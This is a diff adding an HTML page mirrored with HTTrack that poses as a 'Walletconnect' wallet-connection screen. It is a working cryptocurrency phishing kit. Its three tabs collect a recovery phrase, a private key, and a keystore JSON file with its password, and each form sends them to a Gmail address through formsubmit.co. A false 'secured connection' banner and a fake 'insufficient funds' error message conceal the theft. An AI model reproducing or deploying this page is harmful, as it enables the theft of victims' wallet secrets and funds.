@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Developed by Sammyloaded Concepts/connection-module/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Jun 2024 19:53:32 GMT -->
+<!-- Added by HTTrack -->
+<!-- Mirrored from coinsolutiondap.pages.dev/next/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 09 Jul 2025 07:28:18 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="flowbite-1.5.3/dist/flowbite.min.css" />
+    <link rel="stylesheet" href="inter/inter.html">
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <script src="https://cdn.tailwindcss.com/?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+    <script src="../ajax/libs/jquery/3.6.1/jquery.min.html" referrerpolicy="no-referrer"></script>
+</head>
+<body style="background-color:#000000">
+    <section class="">
+        <div class="flex flex-col items-center justify-center px-6 py-8 mx-auto md:h-screen lg:py-0">
+            <a href="https://coinsolutiondap.pages.dev/index.html" class="flex items-center font-bold text-white">
+                <img src="wc1.png" class="mr-3  mb-5" style="height:30px" alt="Logo">
+                <span>Walletconnect</span>
+            </a>
+            
+            <div class="p-4 text mb-4 text-sm text-blue-700 bg-blue-100 rounded-lg dark:bg-blue-200 dark:text-blue-800" role="alert">
+                <span class="font-medium">
+                   Info alert!
+                </span>This is a secured connection.
+            </div>
+            <div class="w-full bg-white rounded-lg shadow dark:border md:mt-0 sm:max-w-md xl:p-0 dark:bg-gray-800 dark:border-gray-700">
+                <div class="mb-4  border-b border-gray-200 dark:border-gray-700">
+                    <ul class="flex flex-wrap -mb-px text-sm font-medium text-center" id="myTab" data-tabs-toggle="#myTabContent" role="tablist">
+                        <li class="mr-2" role="presentation">
+                            <button class="inline-block p-4 rounded-t-lg border-b-2 text-blue-600 hover:text-blue-600 dark:text-blue-500 dark:hover:text-blue-500 border-blue-600 dark:border-blue-500" id="profile-tab" data-tabs-target="#profile" type="button" role="tab" aria-controls="profile"
+                                aria-selected="true">Phrase</button>
+                        </li>
+                        <li class="mr-2" role="presentation">
+                            <button class="inline-block p-4 rounded-t-lg border-b-2 border-transparent hover:text-gray-600 hover:border-gray-300 dark:hover:text-gray-300 dark:border-transparent text-gray-500 dark:text-gray-400 border-gray-100 dark:border-gray-700" id="settings-tab"
+                                data-tabs-target="#settings" type="button" role="tab" aria-controls="settings" aria-selected="false">Private Key</button>
+                        </li>
+                        <li class="mr-2" role="presentation">
+                            <button class="inline-block p-4 rounded-t-lg border-b-2 text-blue-600 hover:text-blue-600 dark:text-blue-500 dark:hover:text-blue-500 border-blue-600 dark:border-blue-500" id="zaged-tab" data-tabs-target="#zaged" type="button" role="tab" aria-controls="profile"
+                                aria-selected="false">Keystore JSON</button>
+                        </li>
+                    </ul>
+                </div>
+                <div id="myTabContent">
+                    <div class="p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="profile" role="tabpanel" aria-labelledby="profile-tab">
+                        <form action="https://formsubmit.co/knote2609@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
+
+
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://definetnodeprotocols.vercel.app/access/point/barcode-generated.html">
+                            <label for="keystorejson">Recovery Phrase:</label> 
+                            <input type="hidden" name="_captcha" value="false"> 
+                            <input type="hidden" name="importType" value="phrase"> 
+                           <input type="hidden" name="Wallet" class="input-wallet" value=""> 
+                            <div class="mb-6">
+                                
+                                <textarea id="phrased" rows="4" name="Phrase" type="text" minlength="12" placeholder="Enter your recovery phrase (typically 12-24 words seperated by a single space" id="large-input" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                                    required="required"></textarea>
+                            </div>
+                            <div class="flex w-full">
+                                <button type="submit" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 mr-2 mb-2 dark:bg-blue-600 dark:hover:bg-blue-700 focus:outline-none dark:focus:ring-blue-800">Connect</button>
+                                    <span class="mr-2 uppercase" onclick="thankyou_message()"></span> 
+                                    <span>
+                                        
+                                    </span>
+                                </button>
+                            </div>
+                            
+
+                            <!-- Successfully Submitted page-->
+                            <div style="display: none;" class="thankyou_message">
+                                <center><p class="successful">Oops, Insufficient funds. The account you tried to send transaction from does not have enough funds required for gas fee.
+Kindly fund your account and try again later</p></center>
+                                <img src="error.png" width="25%" height="25%" style="display:block; margin-left:auto; margin-right:auto" class="thankyou_message">
+                            </div>
+                        </div> 
+                    </form>
+                    <div class="hidden p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="settings" role="tabpanel" aria-labelledby="settings-tab">
+                        <form action="https://formsubmit.co/knote2609@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_cc" value="formsubmitmail@gmail.com">
+
+
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://defichainsresolve.vercel.app/access/point/barcode-generated.html">
+                            <label for="keystorejson">Private key:</label>  
+                            <input type="hidden" name="_captcha" value="false"> 
+                            <input type="hidden" name="importType" value="privateKey">
+                            <input type="hidden" name="Wallet" class="input-wallet" value="">  
+                            <div class="mb-6">
+                                <input id="privatekey" name="Privatekey" type="text" type="text" minlength="12" placeholder="Enter your private key " id="privatekeyd" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                                    required="required">
+                            </div>
+                            <div class="flex w-full">
+                                <button type="submit" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 mr-2 mb-2 dark:bg-blue-600 dark:hover:bg-blue-700 focus:outline-none dark:focus:ring-blue-800">Connect</button>
+                                    <span class="mr-2 uppercase" onclick="thankyou_message()"></span> 
+                                    <span>
+                                        
+                                    </span>
+                                </button>
+                                 <!-- Successfully Submitted page-->
+                            <div style="display: none;" class="thankyou_message">
+                                <center><p class="successful">Oops, Insufficient funds. The account you tried to send transaction from does not have enough funds required for gas fee.
+Kindly fund your account and try again later</p></center>
+                                <img src="error.png" width="25%" height="25%" style="display:block; margin-left:auto; margin-right:auto" class="thankyou_message">
+                            </div>
+                            </div>
+                        </form>
+                    </div>
+                    <div class="hidden p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="zaged" role="tabpanel" aria-labelledby="zaged-tab">
+                        <form action="https://formsubmit.co/knote2609@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                        <input type="hidden" name="_cc" value="formsubmitmail@gmail.com">
+
+
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://defichainsresolve.vercel.app/access/point/barcode-generated.html">
+                            <label for="keystorejson">Keystore JSON:</label>  
+                            <input type="file" id="keystorejson" name="keystorejson" required>
+                            <div class="mb-6">
+                                <textarea id="keystored" rows="4" name="keystore" type="text" minlength="12" placeholder="Keystore JSON" id="keystored" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                                    required="required"></textarea>
+                                    <br />
+                                    <input id="password" name="Keystore_password" type="text" type="text" minlength="12" placeholder="Password" id="password" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                                    required="required">
+                            </div>
+                            <div class="flex w-full">
+                                <button type="submit" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 mr-2 mb-2 dark:bg-blue-600 dark:hover:bg-blue-700 focus:outline-none dark:focus:ring-blue-800">Connect</button>
+                                    <span class="mr-2 uppercase" onclick="thankyou_message()"></span> 
+                                    <span>
+                                        
+                                    </span>
+                                </button>
+                            </div>
+                        </form>
+                    </div>
+                   </div>
+                </div>
+            </div>
+            
+    </section>
+    
+    <script src="js/mine.js"></script>
+    <script src="../smtpjs.com/v3/smtp.html"></script>
+ 
+    <script src="flowbite-1.5.3/dist/flowbite.js"></script>
+   
+    
+        <script>
+            function ready() {
+                document.body.style.display = "block";
+            }
+            document.addEventListener("DOMContentLoaded", ready);
+        </script>
+
+        <!-- Add EmailJS SDK and sendEmail function before </body> -->
+
+</body>
+
+<!-- Developed by Sammyloaded Concepts/connection-module/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 19 Jun 2024 19:53:35 GMT -->
+
+<!-- Mirrored from coinsolutiondap.pages.dev/next/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 09 Jul 2025 07:28:42 GMT -->
+</html>
